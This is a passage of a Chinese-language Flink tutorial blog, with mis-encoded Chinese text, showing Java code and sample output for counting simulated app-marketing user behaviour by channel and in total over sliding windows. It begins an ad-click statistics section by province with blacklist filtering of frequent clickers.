String&gt; <span class="title">getKey</span><span class="params">(MarketingUserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getChannel(), value.getBehavior());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// å®šä¹‰æ»‘çª—</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> MarketingCountAgg(), <span class="keyword">new</span> MarketingCountResult());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;app marketing by channel job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„æ¨¡æ‹Ÿå¸‚åœºç”¨æˆ·è¡Œä¸ºæ•°æ®æº</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimulatedMarketingUserBehaviorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// æ§åˆ¶æ˜¯å¦æ­£å¸¸è¿è¡Œçš„æ ‡è¯†ä½</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ç”¨æˆ·è¡Œä¸ºå’Œæ¸ é“çš„èŒƒå›´</span></span><br><span class="line">    List&lt;String&gt; behaviorList = Arrays.asList(<span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;DOWNLOAD&quot;</span>, <span class="string">&quot;INSTALL&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>);</span><br><span class="line">    List&lt;String&gt; channelList = Arrays.asList(<span class="string">&quot;app store&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;weibo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="comment">// éšæœºç”Ÿæˆæ‰€æœ‰å­—æ®µ</span></span><br><span class="line">        Long id = random.nextLong();</span><br><span class="line">        String behavior = behaviorList.get(random.nextInt(behaviorList.size()));</span><br><span class="line">        String channel = channelList.get(random.nextInt(channelList.size()));</span><br><span class="line">        Long timestamp = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘å‡ºæ•°æ®</span></span><br><span class="line">        ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(id, behavior, channel, timestamp));</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¢é‡èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">MarketingUserBehavior</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(MarketingUserBehavior value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å…¨çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingCountResult</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">ChannelPromotionCount</span>, <span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">String</span>&gt;, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Tuple2&lt;String, String&gt; stringStringTuple2, Context context, Iterable&lt;Long&gt; elements, Collector&lt;ChannelPromotionCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String channel = stringStringTuple2.f0;</span><br><span class="line">      String behavior = stringStringTuple2.f1;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(context.window().getEnd()).toString();</span><br><span class="line">      Long count = elements.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> ChannelPromotionCount(channel, behavior, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;app store&#x27;, behavior=&#x27;CLICK&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=4&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;DOWNLOAD&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;INSTALL&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;wechat&#x27;, behavior=&#x27;DOWNLOAD&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;wechat&#x27;, behavior=&#x27;INSTALL&#x27;, windowEnd=&#x27;2021-02-05 17:54:40.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;INSTALL&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=1&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;app store&#x27;, behavior=&#x27;DOWNLOAD&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=10&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;weibo&#x27;, behavior=&#x27;CLICK&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=2&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=&#x27;app store&#x27;, behavior=&#x27;CLICK&#x27;, windowEnd=&#x27;2021-02-05 17:54:45.0&#x27;, count=9&#125;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 3-ä¸åˆ†æ¸ é“ä»£ç å®ç°"><a href="#ä»£ç 3-ä¸åˆ†æ¸ é“ä»£ç å®ç°" class="headerlink" title="ä»£ç 3-ä¸åˆ†æ¸ é“ä»£ç å®ç°"></a>ä»£ç 3-ä¸åˆ†æ¸ é“ä»£ç å®ç°</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ChannelPromotionCount;</span><br><span class="line"><span class="keyword">import</span> beans.MarketingUserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.source.SourceFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 6:19 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMarketingStatistics</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»è‡ªå®šä¹‰æ•°æ®æºä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;MarketingUserBehavior&gt; dataStream = env.addSource(<span class="keyword">new</span> AppMarketingByChannel.SimulatedMarketingUserBehaviorSource())</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;MarketingUserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(MarketingUserBehavior element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å¼€çª—ç»Ÿè®¡æ€»é‡</span></span><br><span class="line">    DataStream&lt;ChannelPromotionCount&gt; resultStream = dataStream</span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;UNINSTALL&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;MarketingUserBehavior, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(MarketingUserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;total&quot;</span>, <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .keyBy(tuple2 -&gt; tuple2.f0)</span><br><span class="line">      <span class="comment">// å®šä¹‰æ»‘çª—</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> MarketingStatisticsAgg(), <span class="keyword">new</span> MarketingStatisticsResult());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;app marketing by channel job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„æ¨¡æ‹Ÿå¸‚åœºç”¨æˆ·è¡Œä¸ºæ•°æ®æº</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SimulatedMarketingUserBehaviorSource</span> <span class="keyword">implements</span> <span class="title">SourceFunction</span>&lt;<span class="title">MarketingUserBehavior</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// æ§åˆ¶æ˜¯å¦æ­£å¸¸è¿è¡Œçš„æ ‡è¯†ä½</span></span><br><span class="line">    Boolean running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ç”¨æˆ·è¡Œä¸ºå’Œæ¸ é“çš„èŒƒå›´</span></span><br><span class="line">    List&lt;String&gt; behaviorList = Arrays.asList(<span class="string">&quot;CLICK&quot;</span>, <span class="string">&quot;DOWNLOAD&quot;</span>, <span class="string">&quot;INSTALL&quot;</span>, <span class="string">&quot;UNINSTALL&quot;</span>);</span><br><span class="line">    List&lt;String&gt; channelList = Arrays.asList(<span class="string">&quot;app store&quot;</span>, <span class="string">&quot;wechat&quot;</span>, <span class="string">&quot;weibo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(SourceContext&lt;MarketingUserBehavior&gt; ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">while</span> (running) &#123;</span><br><span class="line">        <span class="comment">// éšæœºç”Ÿæˆæ‰€æœ‰å­—æ®µ</span></span><br><span class="line">        Long id = random.nextLong();</span><br><span class="line">        String behavior = behaviorList.get(random.nextInt(behaviorList.size()));</span><br><span class="line">        String channel = channelList.get(random.nextInt(channelList.size()));</span><br><span class="line">        Long timestamp = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘å‡ºæ•°æ®</span></span><br><span class="line">        ctx.collect(<span class="keyword">new</span> MarketingUserBehavior(id, behavior, channel, timestamp));</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      running = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¢é‡èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingStatisticsAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">String</span>, <span class="title">Long</span>&gt;, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(Tuple2&lt;String, Long&gt; value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å…¨çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MarketingStatisticsResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">ChannelPromotionCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String s, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;ChannelPromotionCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(window.getEnd()).toString();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> ChannelPromotionCount(<span class="string">&quot;total&quot;</span>, <span class="string">&quot;total&quot;</span>, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beans.ChannelPromotionCount&#123;channel=<span class="string">&#x27;total&#x27;</span>, behavior=<span class="string">&#x27;total&#x27;</span>, windowEnd=<span class="string">&#x27;2021-02-05 18:34:15.0&#x27;</span>, count=<span class="number">40</span>&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=<span class="string">&#x27;total&#x27;</span>, behavior=<span class="string">&#x27;total&#x27;</span>, windowEnd=<span class="string">&#x27;2021-02-05 18:34:20.0&#x27;</span>, count=<span class="number">75</span>&#125;</span><br><span class="line">beans.ChannelPromotionCount&#123;channel=<span class="string">&#x27;total&#x27;</span>, behavior=<span class="string">&#x27;total&#x27;</span>, windowEnd=<span class="string">&#x27;2021-02-05 18:34:25.0&#x27;</span>, count=<span class="number">109</span>&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h5 id="å¸‚åœºè¥é”€åˆ†æâ€”â€”é¡µé¢å¹¿å‘Šç»Ÿè®¡"><a href="#å¸‚åœºè¥é”€åˆ†æâ€”â€”é¡µé¢å¹¿å‘Šç»Ÿè®¡" class="headerlink" title="å¸‚åœºè¥é”€åˆ†æâ€”â€”é¡µé¢å¹¿å‘Šç»Ÿè®¡"></a>å¸‚åœºè¥é”€åˆ†æâ€”â€”é¡µé¢å¹¿å‘Šç»Ÿè®¡</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ä»åŸ‹ç‚¹æ—¥å¿—ä¸­ï¼Œç»Ÿè®¡æ¯å°æ—¶é¡µé¢å¹¿å‘Šçš„ç‚¹å‡»é‡ï¼Œ5ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œå¹¶æŒ‰ç…§ä¸åŒçœä»½è¿›è¡Œåˆ’åˆ†</li><li>å¯¹äºâ€åˆ·å•â€å¼çš„é¢‘ç¹ç‚¹å‡»è¡Œä¸ºè¿›è¡Œè¿‡æ»¤ï¼Œå¹¶å°†è¯¥ç”¨æˆ·åŠ å…¥é»‘åå•</li></ul></li><li>è§£å†³æ€è·¯ <ul><li>æ ¹æ®çœä»½è¿›è¡Œåˆ†ç»„ï¼Œåˆ›å»ºé•¿åº¦ä¸º1å°æ—¶ã€æ»‘åŠ¨è·ç¦»ä¸º5ç§’çš„æ—¶é—´çª—å£è¿›è¡Œç»Ÿè®¡</li><li>å¯ä»¥ç”¨<code>process function</code>è¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œæ£€æµ‹ç”¨æˆ·å¯¹åŒä¸€å¹¿å‘Šçš„ç‚¹å‡»é‡ï¼Œå¦‚æœè¶…è¿‡ä¸Šé™åˆ™å°†ç”¨æˆ·ä¿¡æ¯ä»¥ä¾§è¾“å‡ºæµè¾“å‡ºåˆ°é»‘åå•ä¸­</li></ul></li></ul><h6 id="POJO-3"><a href="#POJO-3" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> AdClickEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> Long adId;</span><br><span class="line"><span class="keyword">private</span> String province;</span><br><span class="line"><span class="keyword">private</span> String city;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> BlackListUserWarning  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long userId;</span><br><span class="line"><span class="keyword">private</span> Long adId;</span><br><span class="line"><span class="keyword">private</span> String warningMsg;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-åŸºæœ¬å®ç°"><a href="#ä»£ç 1-åŸºæœ¬å®ç°" class="headerlink" title="ä»£ç 1-åŸºæœ¬å®ç°"></a>ä»£ç 1-åŸºæœ¬å®ç°</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.AdClickEvent;</span><br><span class="line"><span class="keyword">import</span> beans.AdCountViewByProvince;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> 